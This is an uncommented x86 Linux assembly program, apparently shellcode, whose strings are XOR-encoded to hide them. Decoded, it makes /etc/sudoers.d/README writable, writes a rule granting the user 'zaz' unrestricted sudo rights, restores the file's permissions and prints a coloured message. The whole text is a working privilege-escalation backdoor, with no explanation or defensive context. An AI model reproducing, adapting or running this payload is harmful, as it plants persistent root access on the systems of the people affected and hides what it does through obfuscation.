GLOBAL _start

section .text

_start:
	xor edx, edx
	mov dl, 0x45
	push edx
	mov edx, 0xd4ddd8dc
	xor edx, 0x99999999
	push edx
	mov edx, 0xcbb6fdb7
	xor edx, 0x99999999
	push edx
	mov edx, 0xeaebfcf6
	xor edx, 0x99999999
	push edx
	push 0x6475732f
	mov edx, 0xfaedfcb6
	xor edx, 0x99999999
	push edx
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x01ff
	xor eax, eax
	mov al, 15
	int 0x80

	xor edx, edx
	mov dl, 0x45
	push edx
	mov edx, 0xd4ddd8dc
	xor edx, 0x99999999
	push edx
	mov edx, 0xcbb6fdb7
	xor edx, 0x99999999
	push edx
	mov edx, 0xeaebfcf6
	xor edx, 0x99999999
	push edx
	push 0x6475732f
	mov edx, 0xfaedfcb6
	xor edx, 0x99999999
	push edx
	mov ebx, esp
	xor ecx, ecx
	mov cl, 0x01
	xor eax, eax
	mov al, 5
	int 0x80

	mov ebx, eax
	mov edx, 0x66456c2a
	xor edx, 0x66666666
	push edx
	mov edx, 0x2a27464f
	xor edx, 0x66666666
	push edx
	push 0x4c4c413a
	push 0x4c4c4128
	push 0x3d4c4c41

	mov edx, 0x461c071c
	xor edx, 0x66666666
	push edx
	mov ecx, esp
	xor edx, edx
	mov dl, 23
	xor eax, eax
	mov al, 4
	int 0x80

	xor edx, edx
	mov dl, 0x45
	push edx
	mov edx, 0xd4ddd8dc
	xor edx, 0x99999999
	push edx
	mov edx, 0xcbb6fdb7
	xor edx, 0x99999999
	push edx
	mov edx, 0xeaebfcf6
	xor edx, 0x99999999
	push edx
	push 0x6475732f
	mov edx, 0xfaedfcb6
	xor edx, 0x99999999
	push edx
	mov ebx, esp
	mov ecx, 0x999998b9
	xor ecx, 0x99999999
	xor eax, eax
	mov al, 15
	int 0x80

	xor edx, edx
	push edx
	push 0x44454e57
	push 0x506d3133
	push 0x3b313b35
	push 0x5b1b631b

	xor ebx, ebx
	mov bl, 0x1
	mov ecx, esp
	xor edx, edx
	mov dl, 17
	xor eax, eax
	mov al, 0x4
	int 0x80

	xor eax, eax
	mov al, 0x01
	xor ebx,ebx
	int 0x80
